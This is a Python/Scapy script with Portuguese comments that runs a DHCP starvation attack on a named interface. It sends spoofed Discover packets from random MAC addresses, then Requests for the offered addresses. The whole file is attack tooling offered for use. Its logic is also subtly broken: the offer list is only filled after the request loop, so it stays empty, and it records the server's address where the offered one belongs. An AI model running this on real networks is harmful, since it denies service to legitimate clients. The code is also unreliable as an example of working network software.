from scapy.all import *
import time

def dhcp_starvation(interface, num_packets, delay):
    # Desativar a verificação de endereço IP no Scapy
    conf.checkIPaddr = False
    
    # Lista para armazenar os IPs oferecidos
    offered_ips = []

    # Função para lidar com pacotes DHCP
    def handle_dhcp(pkt):
        if DHCP in pkt:
            if pkt[DHCP].options[0][1] == 2:  # DHCP Offer
                offered_ips.append(pkt[IP].src)
                print(f"Received DHCP Offer from {pkt[IP].src}")

    # Fase de Discover
    for _ in range(num_packets):
        mac_address = RandMAC()
        dhcp_discover = Ether(src=mac_address, dst="ff:ff:ff:ff:ff:ff") / \
                        IP(src="0.0.0.0", dst="255.255.255.255") / \
                        UDP(sport=68, dport=67) / \
                        BOOTP(chaddr=mac_address) / \
                        DHCP(options=[("message-type", "discover"), ("end")])

        sendp(dhcp_discover, iface=interface, verbose=0)

        time.sleep(delay)

    # Esperar para todas as respostas DHCP Offer
    time.sleep(2)

    # Fase de Request e ACK
    for ip in offered_ips:
        mac_address = RandMAC()
        dhcp_request = Ether(src=mac_address, dst="ff:ff:ff:ff:ff:ff") / \
                       IP(src="0.0.0.0", dst="255.255.255.255") / \
                       UDP(sport=68, dport=67) / \
                       BOOTP(chaddr=mac_address) / \
                       DHCP(options=[("message-type", "request"),
                                     ("requested_addr", ip),
                                     ("end")])

        sendp(dhcp_request, iface=interface, verbose=0)
        print(f"Sent DHCP Request for {ip}")

        time.sleep(delay)

        # Aguardar resposta DHCP ACK
        sniff(filter=f"udp and (port 67 or port 68) and host {ip}", prn=handle_dhcp, timeout=5, iface=interface)

if __name__ == "__main__":
    interface = "eth0"   # Interface de rede a ser usada para o ataque
    num_packets = 10     # Número de pacotes DHCP Discover a serem enviados
    delay = 0.5          # Atraso entre o envio de cada pacote em segundos

    dhcp_starvation(interface, num_packets, delay)

